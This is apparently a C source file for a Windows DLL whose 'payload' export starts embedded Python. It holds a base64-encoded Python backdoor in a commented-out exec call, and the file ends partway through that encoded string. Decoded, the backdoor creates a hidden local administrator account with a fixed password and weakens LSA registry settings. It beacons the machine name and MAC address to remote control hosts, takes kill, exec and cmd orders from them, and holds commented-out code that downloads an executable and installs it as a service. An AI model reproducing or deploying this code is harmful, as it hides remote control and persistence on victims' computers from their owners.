#include<stdio.h>
#include<Windows.h>
#include<Python.h>

void CALLBACK payload(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
  MessageBox(0,"Hello World from DLL!\n","Hi",MB_ICONINFORMATION);
  Py_Initialize();
  //PyRun_SimpleString("print('Hello World from Embedded Python!!!')");
  //PyRun_SimpleString("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHdpbjMyc2VydmljZXV0aWwKaW1wb3J0IHdpbjMyc2VydmljZQppbXBvcnQgd2luMzJldmVudAppbXBvcnQgc29ja2V0CmltcG9ydCBzZXJ2aWNlbWFuYWdlcgppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBhc3luY29yZQppbXBvcnQgc2NoZWQsdGltZQppbXBvcnQgc3lzCmltcG9ydCBvcwoKI2ltcG9ydCBDcnlwdG8KI2ltcG9ydCBlY2RzYQojaW1wb3J0IHBhcmFtaWtvCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBodHRwbGliCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdXJsbGliMgojaW1wb3J0IHB5Y3VybApmcm9tIG9zIGltcG9ydCBwYXRoLCBhY2Nlc3MsIFJfT0sKZnJvbSB1dWlkIGltcG9ydCBnZXRub2RlIGFzIGdldF9tYWMKZnJvbSBzdWJwcm9jZXNzIGltcG9ydCBQb3Blbgpmcm9tIGZha2VfdXNlcmFnZW50IGltcG9ydCBVc2VyQWdlbnQKaW1wb3J0IHJlcXVlc3RzCiNpbXBvcnQgbG9nZ2luZwojZnJvbSBsb2dnaW5nLmhhbmRsZXJzIGltcG9ydCBSb3RhdGluZ0ZpbGVIYW5kbGVyCgojaW1wb3J0IHdpbjMydWksIHdpbjMyZ3VpLCB3aW4zMmNvbSwgcHl0aG9uY29tLCB3aW4zMmNvbgojZnJvbSB3aW4zMmNvbS5jbGllbnQgaW1wb3J0IERpc3BhdGNoCiNmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCiNpbXBvcnQgX3dpbnJlZwoKCgoKCiNXaW4tUHl0aG9uLUJhY2tkb29yCgojcGlwIGluc3RhbGwgcmVxdWVzdHMKI3BpcCBpbnN0YWxsIGZha2VfdXNlcmFnZW50CiNjZCBDOlxQeXRob24yNwojY29weSAveSAiJVVTRVJQUk9GSUxFJVxEb2N1bWVudHNcR2l0SHViXFdpbi1QeXRob24tQmFja2Rvb3Jcd29mZmljZWllMS5weSIgQzpcUHl0aG9uMjcKI2NvcHkgL3kgIiVVU0VSUFJPRklMRSVcRG9jdW1lbnRzXEdpdEh1YlxXaW4tUHl0aG9uLUJhY2tkb29yXHdvZmZpY2VpZTEucHkiIEM6XFB5dGhvbjI3XzY0CiMuXHB5dGhvbiAiJVVTRVJQUk9GSUxFJVxEb2N1bWVudHNcR2l0SHViXFdpbi1QeXRob24tQmFja2Rvb3Jcc2V0dXBzZXJpZTE2NC5weSIgcHkyZXhlCiMuXHB5dGhvbiAiJVVTRVJQUk9GSUxFJVxEb2N1bWVudHNcR2l0SHViXFdpbi1QeXRob24tQmFja2Rvb3Jcc2V0dXBzZXJpZTEucHkiIHB5MmV4ZQojY29weSAveSBDOlxweXRob24yN1xkaXN0XHdvZmZpY2VpZTEuZXhlICVVU0VSUFJPRklMRSVcRG9jdW1lbnRzXEdpdEh1YlxXaW4tUHl0aG9uLUJhY2tkb29yXHd1cC5leGUKZGVmIGdldF9tYWNhZGRyZXNzKGhvc3Q9J2xvY2FsaG9zdCcpOgogICAgIiIiIFJldHVybnMgdGhlIE1BQyBhZGRyZXNzIG9mIGEgbmV0d29yayBob3N0LCByZXF1aXJlcyA+PSBXSU4ySy4gIiIiCiAgICAjIGh0dHA6Ly9hc3BuLmFjdGl2ZXN0YXRlLmNvbS9BU1BOL0Nvb2tib29rL1B5dGhvbi9SZWNpcGUvMzQ3ODEyCiAgICBpbXBvcnQgY3R5cGVzCiAgICBpbXBvcnQgc29ja2V0CiAgICBpbXBvcnQgc3RydWN0CiAKICAgICMgQ2hlY2sgZm9yIGFwaSBhdmFpbGFiaWxpdHkKICAgIHRyeToKICAgICAgICBTZW5kQVJQID0gY3R5cGVzLndpbmRsbC5JcGhscGFwaS5TZW5kQVJQCiAgICBleGNlcHQ6CiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcignVXNhZ2Ugb25seSBvbiBXaW5kb3dzIDIwMDAgYW5kIGFib3ZlJykKIAogICAgIyBEb2Vzbid0IHdvcmsgd2l0aCBsb29wYmFja3MsIGJ1dCBsZXQncyB0cnkgYW5kIGhlbHAuCiAgICBpZiBob3N0ID09ICcxMjcuMC4wLjEnIG9yIGhvc3QubG93ZXIoKSA9PSAnbG9jYWxob3N0JzoKICAgICAgICBob3N0ID0gc29ja2V0LmdldGhvc3RuYW1lKCkKIAogICAgIyBnZXRob3N0YnluYW1lIGJsb2Nrcywgc28gdXNlIGl0IHdpc2VseS4KICAgIHRyeToKICAgICAgICBpbmV0YWRkciA9IGN0eXBlcy53aW5kbGwud3NvY2szMi5pbmV0X2FkZHIoaG9zdCkKICAgICAgICBpZiBpbmV0YWRkciBpbiAoMCwgLTEpOgogICAgICAgICAgICByYWlzZSBFeGNlcHRpb24KICAgIGV4Y2VwdDoKICAgICAgICBob3N0aXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFtZShob3N0KQogICAgICAgIGluZXRhZGRyID0gY3R5cGVzLndpbmRsbC53c29jazMyLmluZXRfYWRkcihob3N0aXApCiAKICAgIGJ1ZmZlciA9IGN0eXBlcy5jX2J1ZmZlcig2KQogICAgYWRkbGVuID0gY3R5cGVzLmNfdWxvbmcoY3R5cGVzLnNpemVvZihidWZmZXIpKQogICAgaWYgU2VuZEFSUChpbmV0YWRkciwgMCwgY3R5cGVzLmJ5cmVmKGJ1ZmZlciksIGN0eXBlcy5ieXJlZihhZGRsZW4pKSAhPSAwOgogICAgICAgIHJhaXNlIFdpbmRvd3NFcnJvcignUmV0cmVpdmFsIG9mIG1hYyBhZGRyZXNzKCVzKSAtIGZhaWxlZCcgJSBob3N0KQogCiAgICAjIENvbnZlcnQgYmluYXJ5IGRhdGEgaW50byBhIHN0cmluZy4KICAgIG1hY2FkZHIgPSAnJwogICAgZm9yIGludHZhbCBpbiBzdHJ1Y3QudW5wYWNrKCdCQkJCQkInLCBidWZmZXIpOgogICAgICAgIGlmIGludHZhbCA+IDE1OgogICAgICAgICAgICByZXBsYWNlc3RyID0gJzB4JwogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJlcGxhY2VzdHIgPSAneCcKICAgICAgICBpZiBtYWNhZGRyICE9ICcnOgogICAgICAgICAgICAjbWFjYWRkciA9ICc6Jy5qb2luKFttYWNhZGRyLCBoZXgoaW50dmFsKS5yZXBsYWNlKHJlcGxhY2VzdHIsICcnKV0pCiAgICAgICAgICAgIG1hY2FkZHIgPSAnJy5qb2luKFttYWNhZGRyLCBoZXgoaW50dmFsKS5yZXBsYWNlKHJlcGxhY2VzdHIsICcnKV0pCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbWFjYWRkciA9ICcnLmpvaW4oW21hY2FkZHIsIGhleChpbnR2YWwpLnJlcGxhY2UocmVwbGFjZXN0ciwgJycpXSkKIAogICAgcmV0dXJuIG1hY2FkZHIudXBwZXIoKQoKCgogICAgICAgCmRlZiBJbml0KCk6CiAgICAgICAgICAgICAgICAgICAgICAgICNvcy5lbnZpcm9uWyJSRVFVRVNUU19DQV9CVU5ETEUiXSA9IHN3aW4rIi9jYWNlcnQucGVtIgogICAgICAgICAgICAgICAgICAgICAgICAjb3MuZW52aXJvblsiUkVRVUVTVFNfQ0FfQlVORExFIl0gPSBvcy5wYXRoLmpvaW4ob3MuZ2V0Y3dkKCksICJjZXJ0aWZpIiwgImNhY2VydC5wZW0iKQogICAgICAgICAgICAgICAgICAgICAgICAjY2VydGlmaS5jb3JlLndoZXJlPXN3aW4rIi9jZXJ0aWZpL2NhY2VydC5wZW0iCiAgICAgICAgICAgICAgICAgICAgICAgICNyZXF1ZXN0cy51dGlscy5ERUZBVUxUX0NBX0JVTkRMRV9QQVRIPXN3aW4rIi9jZXJ0aWZpL2NhY2VydC5wZW0iCiAgICAgICAgICAgICAgICAgICAgICAgICNyZXF1ZXN0cy5hZGFwdGVycy5ERUZBVUxUX0NBX0JVTkRMRV9QQVRIID0gc3dpbisiL2NlcnRpZmkvY2FjZXJ0LnBlbSIKICAgICNvcy5zeXN0ZW0oIm5ldC5leGUgdXNlciBBZG1pbmlzdHJhdG9yIC9hY3RpdmU6eWVzIikKICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJuZXQuZXhlIHVzZXIgYXNwIFF3ZXJ0eTEyISAvYWRkIikKICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJuZXQuZXhlIGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnMgYXNwIC9hZGQiKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInJlZyBhZGQgSEtMTVxcU3lzdGVtXFxDdXJyZW50Q29udHJvbFNldFxcQ29udHJvbFxcTHNhIC92IGZvcmNlZ3Vlc3QgL3QgUkVHX0RXT1JEIC9kIDAgL2YiKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInJlZyBhZGQgSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFBvbGljaWVzXFxzeXN0ZW0gL3YgTG9jYWxBY2NvdW50VG9rZW5GaWx0ZXJQb2xpY3kgL3QgUkVHX0RXT1JEIC9kIDEgL2YiKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oIndtaWMgcGF0aCBXaW4zMl9Vc2VyQWNjb3VudCB3aGVyZSBOYW1lPVwnYXNwXCcgc2V0IFBhc3N3b3JkRXhwaXJlcz1mYWxzZSIpCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgicmVnIGFkZCBoa2xtXFxzeXN0ZW1cXGN1cnJlbnRjb250cm9sc2V0XFxjb250cm9sXFxsc2EgL3YgTGltaXRCbGFua1Bhc3N3b3JkVXNlIC90IFJFR19EV09SRCAvZCAwIC9mIikKICAgICAgICAgICAgICAgICAgICAgICAgI29zLnN5c3RlbSgibmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZiIpCiMjICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cygnYzpcXHdpbmRvd3NcXHd1cC5leGUnKToKIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ3Bvd2Vyc2hlbGwgLUNvbW1hbmQgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL2NlcnRpZmljYXRlcy5kZG5zLm5ldC93b2ZmaWNlaWUuZXhlIiAtT3V0RmlsZSAiYzpcXHdpbmRvd3NcXHd1cC5leGUiJykKIyMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLmNhbGwoInNjIGNyZWF0ZSB3dXAgYmluUGF0aD0gXCIiK29zLmdldGVudignd2luZGlyJykrIlxcd3VwLmV4ZVwiIERpc3BsYXlOYW1lPSBcIldpbmRvd3MgT2ZmaWNlXCIgc3RhcnQ9IGF1dG8iLCBjcmVhdGlvbmZsYWdzPUNSRUFURV9OT19XSU5ET1cpCiMjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jYWxsKCJuZXQgc3RhcnQgd3VwIiwgY3JlYXRpb25mbGFncz1DUkVBVEVfTk9fV0lORE9XKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoJ2M6XFx3aW5kb3dzXFxzeXN3b3c2NCcpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHMiIC9mJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3MgTlRcXEN1cnJlbnRWZXJzaW9uXFxXaW5sb2dvblxcU3BlY2lhbEFjY291bnRzXFxVc2VyTGlzdCIgL2YnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHNcXFVzZXJMaXN0IiAvdiBhc3AgL3QgUkVHX0RXT1JEIC9kIDAgL2YnKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHMiIC9mIC9yZWc6NjQnKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93cyBOVFxcQ3VycmVudFZlcnNpb25cXFdpbmxvZ29uXFxTcGVjaWFsQWNjb3VudHNcXFVzZXJMaXN0IiAvZiAvcmVnOjY0JykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcV2lubG9nb25cXFNwZWNpYWxBY2NvdW50c1xcVXNlckxpc3QiIC92IEFkbWluaXN0cmF0b3IgL3QgUkVHX0RXT1JEIC9kIDAgL2YgL3JlZzo2NCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKCdyZWcgYWRkICJIS0xNXFxTT0ZUV0FSRVxcTWljcm9zb2Z0XFxXaW5kb3dzIE5UXFxDdXJyZW50VmVyc2lvblxcV2lubG9nb25cXFNwZWNpYWxBY2NvdW50c1xcVXNlckxpc3QiIC92IGFzcCAvdCBSRUdfRFdPUkQgL2QgMCAvZiAvcmVnOjY0JykKICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAjb3Muc3lzdGVtKCJuZXQuZXhlIHVzZXIgQWRtaW5pc3RyYXRvciBRd2VydHkxMiIpCiAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgibmV0LmV4ZSB1c2VyIGFzcCBRd2VydHkxMiEiKQogICAgICAgICAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oIm5ldC5leGUgdXNlciBhc3AgL2FjdGl2ZTp5ZXMiKQogICAgICAgICAgICAgICAgICAgICAgICBzaW5pdD0nMScKZGVmIG15bG9vcCgpOgogICAgI3RocmVhZGluZy5UaW1lcigxMC4wLCBteWxvb3ApLnN0YXJ0KCkgIyBjYWxsZWQgZXZlcnkgbWludXRlICAgCiAgICBzaW5pdD0nMCcKICAgICNzaXRlcyA9IFsicGFuZXIuYWx0ZXJ2aXN0YS5vcmciLCAidmVyaWZpY2hlLmRkbnMubmV0Il0KICAgICN1YSA9IFVzZXJBZ2VudCgpCiAgICAjaGVhZGVyID0geydVc2VyLUFnZW50JzpzdHIodWEuY2hyb21lKX0KICAgIHNpdGVzID0gWyJwYW5lci5hbHRlcnZpc3RhLm9yZyJdIywgbWFpbnNpdGUudGV4dF0KICAgIGhlYWRlciA9IHsnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCd9CiAgICB0cnk6CiAgICAgIGlwPXNvY2tldC5nZXRob3N0YnluYW1lKCdjb25maWcwMS5ob21lcGMuaXQnKQogICAgICBtYWluc2l0ZSA9IHJlcXVlc3RzLmdldCgiaHR0cDovLyIraXArIi9zaXRlLnR4dCIsIGhlYWRlcnM9aGVhZGVyKQogICAgICBmb3IgbXlzaXRlIGluIG1haW5zaXRlLnRleHQuc3BsaXQoIiwiKToKICAgICAgICAgI3ByaW50IHNvY2tldC5nZXRob3N0YnluYW1lKG15c2l0ZSkKICAgICAgICAgc2l0ZXMuYXBwZW5kKHNvY2tldC5nZXRob3N0YnluYW1lKG15c2l0ZSkpCiAgICAgICNzaXRlcy5leHRlbmQobWFpbnNpdGUudGV4dC5zcGxpdCgiLCIpICkKICAgIGV4Y2VwdCBFeGNlcHRpb24sZToKICAgICAgcHJpbnQgc3RyKGUpCiAgICAjcCA9IFBvcGVuKCJjdXJsIC1MIC1BICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA1LjEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zNC4wLjE4NjYuMjM3IFNhZmFyaS81MzcuMzYnIGh0dHBzOi8vZHJpdmUuZ29vZ2xlLmNvbS91Yz9leHBvcnQ9ZG93bmxvYWQmaWQ9MW5UMmhRV1cxdE9NX3l4UEs1X25oSW04eEJWRVRHWGRGIC1vICIrb3MuZ2V0ZW52KCdURU1QJykrIlxcc2l0ZXMudHh0IixzaGVsbD1UcnVlKQogICAgI3RpbWUuc2xlZXAoNSkKICAgICN0ZXh0X2ZpbGUgPSBvcGVuKG9zLmdldGVudignVEVNUCcpKyJcXHNpdGVzLnR4dCIsICJyIikgICAgCiAgICAjdGV4dF9maWxlX2NvbnRlbnQ9dGV4dF9maWxlLnJlYWQoKQogICAgI3NpdGVzLmV4dGVuZCh0ZXh0X2ZpbGVfY29udGVudC5zcGxpdCgiLCIpICkKICAgICN0ZXh0X2ZpbGUuY2xvc2UoKQogICAgI3ByaW50IG1haW5zaXRlLnRleHQKICAgIAogICAgCiAgICAjc2l0ZT0icGFuZXIuYWx0ZXJ2aXN0YS5vcmciCiAgICBzaXRlMT0icGFuZXIuYWx0ZXJ2aXN0YS5vcmciCiAgICBzaXRlMj0iNTIuMjYuMTI0LjE0NSIKICAgIHNpdGUzPSJjZXJ0aWZpY2F0ZXMuZGRucy5uZXQiCiAgICAjb3Muc3lzdGVtKCJyZWcgYWRkIEhLTE1cXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4gL3YgdXJsc3BhY2UgL3QgUkVHX1NaICAgL2QgICIrb3MuZ2V0ZW52KCd3aW5kaXInKSsiXFx1cC5leGUgL2YiKQogICAgI29zLnN5c3RlbSgiY21kIC9jIGNvcHkgL3kgIitvcy5nZXRlbnYoJ3dpbmRpcicpKyJcXHVwaWUuZXhlICIrb3MuZ2V0ZW52KCd3aW5kaXInKSsiXFx1cC5leGUiKQoKCiAgICAKICAgIAogICAgCiAgICAjcHJpbnQoaGVhZGVyKQogICAgCiAgICAKIyAgICBsb2dfZm9ybWF0dGVyID0gbG9nZ2luZy5Gb3JtYXR0ZXIoJyUoYXNjdGltZSlzICUobWVzc2FnZSlzJywgZGF0ZWZtdD0nJW0vJWQvJVkgJUk6JU06JVMgJXAnKQoKIyAgICBsb2dGaWxlID0gb3MuZ2V0ZW52KCd3aW5kaXInKSsiXFx3dXAubG9nIgoKIyAgICBteV9oYW5kbGVyID0gUm90YXRpbmdGaWxlSGFuZGxlcihsb2dGaWxlLCBtb2RlPSdhJywgbWF4Qnl0ZXM9MSoxMDI0LCAKIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJhY2t1cENvdW50PTIsIGVuY29kaW5nPU5vbmUsIGRlbGF5PTApCiMgICAgbXlfaGFuZGxlci5zZXRGb3JtYXR0ZXIobG9nX2Zvcm1hdHRlcikKIyAgICBteV9oYW5kbGVyLnNldExldmVsKGxvZ2dpbmcuSU5GTykKCiMgICAgYXBwX2xvZyA9IGxvZ2dpbmcuZ2V0TG9nZ2VyKCdyb290JykKIyAgICBhcHBfbG9nLnNldExldmVsKGxvZ2dpbmcuSU5GTykKCiMgICAgYXBwX2xvZy5hZGRIYW5kbGVyKG15X2hhbmRsZXIpCgoKICAgICNhcHBfbG9nLmluZm8oImRhdGEiKQogICAgCiAgICAKICAgICNsb2dnaW5nLmJhc2ljQ29uZmlnKGZpbGVuYW1lPW9zLmdldGVudignd2luZGlyJykrIlxcd3VwLmxvZyIsbGV2ZWw9bG9nZ2luZy5JTkZPLCBmb3JtYXQ9JyUoYXNjdGltZSlzICUobWVzc2FnZSlzJywgZGF0ZWZtdD0nJW0vJWQvJVkgJUk6JU06JVMgJXAnKQojICAgIGFwcF9sb2cuaW5mbygnU3RhcnQnKQogICAgCiAgICAKCiAgICAKICAgIAojd2hpbGUgVHJ1ZToKCiAgICAKICAgIGZvciBzaXRlIGluIHNpdGVzOgogICAgICB0cnk6CiAgICAgICAgICAgICAgI2FwcF9sb2cuaW5mbygnU3RlcCcpCiAgICAgICAgICAgICAgI2lmIHNpbml0ID09ICcwJzoKICAgICAgICAgICAgICAjICAgICAgICBJbml0KCkKICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICNodHRwU2VydiA9IGh0dHBsaWIuSFRUUENvbm5lY3Rpb24oc2l0ZSwgODApCiAgICAgICAgICAgICAgI2h0dHBTZXJ2LmNvbm5lY3QoKQogICAgICAgICAgICAgIAogICAgICAgICAgICAgIG15bWFjID0gZ2V0X21hYygpCiAgICAgICAgICAgICAgc21hY2FkZHJlc3MgPSBnZXRfbWFjYWRkcmVzcygnbG9jYWxob3N0JykKICAgICAgICAgICAgICBzQ09NUFVURVJOQU1FPW9zLmdldGVudignQ09NUFVURVJOQU1FJykrIl8iK3NtYWNhZGRyZXNzCiAgICAgICAgICAgICAgc1RpbWU9JycKICAgICAgICAgICAgICAjc1RpbWU9dGltZS5jdGltZShvcy5wYXRoLmdldG10aW1lKG9zLmdldGVudignd2luZGlyJykrIlxcd3VwLmV4ZSIpKQogICAgICAgICAgICAgICNzVGltZT1zVGltZS5yZXBsYWNlKCIgIiwiXyIpCiAgICAgICAgICAgICAgI29wZW5lciA9IHVybGxpYjIuYnVpbGRfb3BlbmVyKFNvY2tzaVB5SGFuZGxlcihzb2Nrcy5QUk9YWV9UWVBFX1NPQ0tTNCwgJzUyLjI2LjEyNC4xNDUnLCA4MDgwKSkKICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBvcGVuZXIub3BlbigiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJnd1cD0iK3NUaW1lKS5yZWFkKCkKICAgICAgICAgICAgICAjcmVzcG9uc2UgPSB1cmxsaWIyLnVybG9wZW4oImh0dHA6Ly8iK3NpdGUrIi9zdmMvd3VwLnBocD9wYz0iK3NDT01QVVRFUk5BTUUrIiZ3dXA9IitzVGltZSkjKyImZHVtcD1hYWFhYSIpCiAgICAgICAgICAgICAgI2h0dHBTZXJ2LnJlcXVlc3QoJ0dFVCcsICIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImd3VwPSIrc1RpbWUpCiAgICAgICAgICAgICAgI3Jlc3BvbnNlID0gaHR0cFNlcnYuZ2V0cmVzcG9uc2UoKQogICAgICAgICAgICAgIHVybCA9ICJodHRwOi8vIitzaXRlKyIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImd3VwPSIrc1RpbWUKICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVyKQogICAgICAgICAgICAgICNzcmVzcG9uc2U9cmVzcG9uc2UucmVhZCgpCiAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOiNodHRwbGliLk9LOgogICAgICAgICAgICAgICNpZiBzcmVzcG9uc2UhPSAnJzoKICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJPdXRwdXQgZnJvbSBIVE1MIHJlcXVlc3QiCiAgICAgICAgICAgICAgICAgICAgICBzcmVzcG9uc2UgPSByZXNwb25zZS50ZXh0CiAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgnaXA9JykKICAgICAgICAgICAgICAgICAgICAgIHNpcCA9IHNyZXNwb25zZVtpZmluZCszOnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgaWZpbmQ9c3Jlc3BvbnNlLmZpbmQoJ3BvcnQ9JykKICAgICAgICAgICAgICAgICAgICAgIHNwb3J0ID0gc3Jlc3BvbnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgna2lsbD0nKQogICAgICAgICAgICAgICAgICAgICAgc2tpbGwgPSBzcmVzcG9uc2VbaWZpbmQrNTpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdpb3V0PScpCiAgICAgICAgICAgICAgICAgICAgICBzb3V0ID0gc3Jlc3BvbnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgnZXhlYz0nKQogICAgICAgICAgICAgICAgICAgICAgc2V4ZWMgPSBzcmVzcG9uc2VbaWZpbmQrNTpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdjbWQ9JykKICAgICAgICAgICAgICAgICAgICAgIHNjbWQgPSBzcmVzcG9uc2VbaWZpbmQrNDpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgIHByaW50IHNraWxsCiAgICAgICAgICAgICAgZWxzZToKIyAgICAgICAgICAgICAgICAgICAgICBsb2dnaW5nLmluZm8oJ05vdCAyMDAnKQogICAgICAgICAgICAgICAgICAgICAgI215bG9vcCgpCiAgICAgICAgICAgICAgICAgICAgICBpZiBzaXRlID09IHNpdGUxOgogICAgICAgICAgICAgICAgICAgICAgICAgIHNpdGU9c2l0ZTIKICAgICAgICAgICAgICAgICAgICAgIGVsaWYgc2l0ZSA9PSBzaXRlMjoKICAgICAgICAgICAgICAgICAgICAgICAgICBzaXRlPXNpdGUzCiAgICAgICAgICAgICAgICAgICAgICBlbGlmIHNpdGUgPT0gc2l0ZTM6CiAgICAgICAgICAgICAgICAgICAgICAgICAgc2l0ZT1zaXRlMQogICAgICAgICAgICAgICAgICAgICAgI2h0dHBTZXJ2LnJlcXVlc3QoJ0dFVCcsICIvc3ZjL3d1cC5waHA/cGM9IitzQ09NUFVURVJOQU1FKyImd3VwPSIrc1RpbWUpCiAgICAgICAgICAgICAgICAgICAgICAjcmVzcG9uc2UgPSBodHRwU2Vydi5nZXRyZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICB1cmwgPSAiaHR0cDovLyIrc2l0ZSsiL3N2Yy93dXAucGhwP3BjPSIrc0NPTVBVVEVSTkFNRSsiJnd1cD0iK3NUaW1lCiAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwsIGhlYWRlcnM9aGVhZGVyKQogICAgICAgICAgICAgICAgICAgICAgI2lmIHNyZXNwb25zZSE9ICcnOgogICAgICAgICAgICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOiNodHRwbGliLk9LOgogICAgICAgICAgICAgICAgICAgICAgICAgIHByaW50ICJPdXRwdXQgZnJvbSBIVE1MIHJlcXVlc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgc3Jlc3BvbnNlID0gcmVzcG9uc2UudGV4dAogICAgICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdpcD0nKQogICAgICAgICAgICAgICAgICAgICAgICAgIHNpcCA9IHNyZXNwb25zZVtpZmluZCszOnNyZXNwb25zZS5maW5kKCd8fCcsaWZpbmQpXQogICAgICAgICAgICAgICAgICAgICAgICAgIGlmaW5kPXNyZXNwb25zZS5maW5kKCdwb3J0PScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgc3BvcnQgPSBzcmVzcG9uc2VbaWZpbmQrNTpzcmVzcG9uc2UuZmluZCgnfHwnLGlmaW5kKV0KICAgICAgICAgICAgICAgICAgICAgICAgICBpZmluZD1zcmVzcG9uc2UuZmluZCgna2lsbD0nKQogICAgICAgICAgICAgICAgICAgICAgICAgIHNraWxsID0gc3Jlc3BvbnNlW2lmaW5kKzU6c3Jlc3BvbnNlLmZpbmQoJ3x8JyxpZmluZCldCiAgICAgICAgICAgICAgICAgICAgICAgICAgaWZpbmQ9c3Jlc3BvbnNlLmZpbmQoJ2lvdXQ9JykKICAgICAgICAgICAgICAgICAgICAgICAgICBzb3V0ID0gc3Jlc3Bv